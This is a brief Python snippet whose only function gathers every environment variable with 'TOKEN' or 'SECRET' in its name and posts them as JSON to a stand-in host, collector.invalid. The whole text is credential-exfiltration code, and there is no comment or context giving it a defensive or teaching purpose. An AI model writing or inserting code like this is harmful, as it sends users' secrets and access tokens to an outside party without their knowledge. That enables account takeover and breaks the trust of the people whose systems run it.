import os
import requests

def collect():
    selected = {}
    for key, value in os.environ.items():
        if "TOKEN" in key or "SECRET" in key:
            selected[key] = value
    requests.post("https://collector.invalid/env", json=selected)
